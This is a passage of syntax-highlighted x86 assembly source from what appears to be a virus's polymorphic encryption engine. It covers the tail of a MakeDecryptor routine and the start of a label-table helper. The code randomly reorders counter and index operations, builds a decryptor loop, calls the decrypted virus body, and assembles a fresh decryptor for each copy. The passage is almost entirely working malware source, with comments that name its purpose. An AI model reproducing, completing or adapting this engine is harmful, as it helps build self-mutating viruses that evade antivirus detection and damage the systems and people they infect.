</span><span class="sc1">;                 mov     eax, [ebp+New_CODE_SECTION]</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">BufferRegister</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">7</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Poly_InsertLabel</span><span class="sc0">      </span><span class="sc1">; Set the label where we jump</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Poly_ExcessJumpInstruction</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; when the</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">          </span><span class="sc1">; index exceeds the data size</span><span class="sc0">
                                              </span><span class="sc1">; and complete the JAE from</span><span class="sc0">
                                              </span><span class="sc1">; before that must jump here.</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">IndexRegister</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Poly_DoPOPReg</span><span class="sc0">         </span><span class="sc1">; Make POP of the original index</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">RandomBoolean</span><span class="sc0">    </span><span class="sc1">; Let's make a random shuffle of the</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">         </span><span class="sc1">; functions that modify the index,</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@AddIndexFirst</span><span class="sc0">    </span><span class="sc1">; mask the index, increase the</span><span class="sc0">
    </span><span class="sc5">@@AddCounterFirst</span><span class="sc4">:</span><span class="sc0">                   </span><span class="sc1">; counter and mask the counter. The</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Poly_ModifyCounter</span><span class="sc0"> </span><span class="sc1">; order for modify/mask must not</span><span class="sc0">
        </span><span class="sc5">@@C_SelectAnotherSequence</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc1">; vary, but we can interleave that</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Random</span><span class="sc0">             </span><span class="sc1">; functions with the others, so</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">             </span><span class="sc1">; that's what we do here.</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">           </span><span class="sc1">; We first select to do IncCounter</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@C_SelectAnotherSequence</span><span class="sc0"> </span><span class="sc1">; or AddIndex, and then we</span><span class="sc0">
                                                </span><span class="sc1">; select randomly the position</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">                     </span><span class="sc1">; of MaskCounter or MaskIndex</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">                  </span><span class="sc1">; while we are coding the</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@AddCounterFirst_Next00</span><span class="sc0">  </span><span class="sc1">; other two functions.</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Poly_MaskCounter</span><span class="sc0">
        </span><span class="sc5">@@AddCounterFirst_Next00</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Poly_ModifyIndex</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@AddCounterFirst_Next01</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Poly_MaskCounter</span><span class="sc0">
        </span><span class="sc5">@@AddCounterFirst_Next01</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Poly_MaskIndex</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">

                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@AddCounterFirst_Next02</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Poly_MaskCounter</span><span class="sc0">
        </span><span class="sc5">@@AddCounterFirst_Next02</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@ModificationMade</span><span class="sc0">


    </span><span class="sc5">@@AddIndexFirst</span><span class="sc4">:</span><span class="sc0">                       </span><span class="sc1">; This makes AddIndex first, and</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Poly_ModifyIndex</span><span class="sc0">   </span><span class="sc1">; then inserts in a random position</span><span class="sc0">
       </span><span class="sc5">@@I_SelectAnotherSequence</span><span class="sc4">:</span><span class="sc0">          </span><span class="sc1">; the MaskIndex function while</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Random</span><span class="sc0">             </span><span class="sc1">; coding the ModifyCounter and the</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">             </span><span class="sc1">; MaskCounter</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@I_SelectAnotherSequence</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@AddIndexFirst_Next00</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Poly_MaskIndex</span><span class="sc0">
       </span><span class="sc5">@@AddIndexFirst_Next00</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Poly_ModifyCounter</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@AddIndexFirst_Next01</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Poly_MaskIndex</span><span class="sc0">
       </span><span class="sc5">@@AddIndexFirst_Next01</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Poly_MaskCounter</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">

                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@AddIndexFirst_Next02</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Poly_MaskIndex</span><span class="sc0">
       </span><span class="sc5">@@AddIndexFirst_Next02</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc1">;; We arrive here with all modifications made and the current DWORD copied</span><span class="sc0">
   </span><span class="sc1">;; and decrypted (or maybe not decrypted and left as is).</span><span class="sc0">

    </span><span class="sc5">@@ModificationMade</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">38h</span><span class="sc0">          </span><span class="sc1">; Make a comparision of the counter</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">        </span><span class="sc1">; with the first value that it had.</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">CounterRegister</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; If it's the same, we</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                  </span><span class="sc1">; have finished the </span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Poly_InitialValue</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; decryption.</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">7</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">75h</span><span class="sc0">          </span><span class="sc1">; Make the JNZ to the loop label</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Poly_LoopLabel</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc0">

</span><span class="sc1">;;;;;;;                               ; Now get the address where the virus</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">        </span><span class="sc1">; is copied/decrypted and CALL there</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">CounterRegister</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">BufferRegister</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">DeltaRegister</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">IndexRegister</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Poly_DoMOVRegMem</span><span class="sc0">   </span><span class="sc1">; Get the DeltaRegister value</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Decryptor_DATA_SECTION</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Poly_DoCALLMem</span><span class="sc0">     </span><span class="sc1">; Call the virus</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Poly_InsertLabel</span><span class="sc0">   </span><span class="sc1">; Insert this label and complete</span><span class="sc0">
                                           </span><span class="sc1">; the jump here (when there was an</span><span class="sc0">
                                           </span><span class="sc1">; error allocating virtual memory)</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Poly_Jump_ErrorInVirtualAlloc</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Poly_JumpRandomExecution</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; If there is a</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">            </span><span class="sc1">; random-execution routine, fix</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@DontSetJump</span><span class="sc0">         </span><span class="sc1">; that jump also.</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

      </span><span class="sc5">@@DontSetJump</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Poly_SelectThreeRegisters</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Poly_DoPUSHValue</span><span class="sc0">    </span><span class="sc1">; Push a value of 0 (no error :)</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ExitProcessAddress</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Poly_DoCALLMem</span><span class="sc0">      </span><span class="sc1">; Call to ExitProcess</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">VarMarksTable</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; Clear the marks of the</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1000h</span><span class="sc0">       </span><span class="sc1">; variables used in this decryptor</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">         </span><span class="sc1">; for the next decryptors that could</span><span class="sc0">
     </span><span class="sc5">@@LoopClearMarks</span><span class="sc4">:</span><span class="sc0">                   </span><span class="sc1">; be made after this one.</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@LoopClearMarks</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">AddressOfLastInstruction</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc1">; Set the address</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">OtherBuffers</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; of the last instruction</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">JumpsTable</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">       </span><span class="sc1">; and some buffers that</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8000h</span><span class="sc0">                  </span><span class="sc1">; we need for the engine</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">FramesTable</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">      </span><span class="sc1">; functions.</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">NewAssembledCode</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">TranslatedDeltaRegister</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">XpandCode</span><span class="sc0">          </span><span class="sc1">; Expand the code of the decryptor</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">InstructionTable</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Now arrange the addresses</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">NewAssembledCode</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc1">; and values needed for</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ExpansionResult</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; the Assembler</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">InstructionTable</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">SizeOfNewCode</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; Save these values that</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">                         </span><span class="sc1">; we must keep</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">RoundedSizeOfNewCode</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">SizeOfNewCodeP2</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">AssembleCode</span><span class="sc0">        </span><span class="sc1">; Assemble the decryptor</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">SizeOfNewCode</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; Set the new addresses</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">SizeOfDecryptor</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">   </span><span class="sc1">; and sizes</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">NewAssembledCode</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">AssembledDecryptor</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">                          </span><span class="sc1">; Restore some values</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">SizeOfNewCodeP2</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">RoundedSizeOfNewCode</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">SizeOfNewCode</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">TranslatedDeltaRegister</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">NewAssembledCode</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

                </span><span class="sc6">ret</span><span class="sc0">                       </span><span class="sc1">; Return with a new brand decryptor.</span><span class="sc0">
</span><span class="sc5">MakeDecryptor</span><span class="sc0">   </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc1">;; Function to insert a label in the label table.</span><span class="sc0">
</span><span class="sc5">Poly_InsertLabel</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">LabelTable</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; Get the label table</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">NumberOfLabels</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Get the number of labels</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@InsertLabel</span><span class="sc0">        </span><span class="sc1">; If 0, insert at the beginning</span><span class="sc0">
       </span><span class="sc5">@@LoopFindLabel</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">         </span><span class="sc1">; If not, check if that label is</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@LabelInserted</span><span class="sc0">      </span><span class="sc1">; already inserted</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">             </span><span class="sc1">; If it is, return the label addr.</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">           </span><span class="sc1">; If not, we insert the new label</span><span class="sc0">
